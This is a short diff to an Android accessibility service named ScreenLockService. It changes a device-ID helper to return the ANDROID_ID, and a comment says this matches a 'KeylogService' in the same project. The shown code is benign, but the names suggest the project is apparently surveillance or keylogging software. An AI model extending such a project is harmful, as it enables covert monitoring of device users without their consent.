@@ -216,8 +216,16 @@ class ScreenLockService : AccessibilityService() {
     /**
      * Obtém o ID do dispositivo
      */
-    private fun resolveDeviceId(): Int {
-        return 1 // TODO: Implementar lógica de ID do dispositivo
+    private fun resolveDeviceId(): String {
+        // Usa o mesmo identificador do KeylogService (ANDROID_ID)
+        return try {
+            android.provider.Settings.Secure.getString(
+                applicationContext.contentResolver,
+                android.provider.Settings.Secure.ANDROID_ID
+            ) ?: "unknown"
+        } catch (_: Exception) {
+            "unknown"
+        }
     }
 
     override fun onInterrupt() {
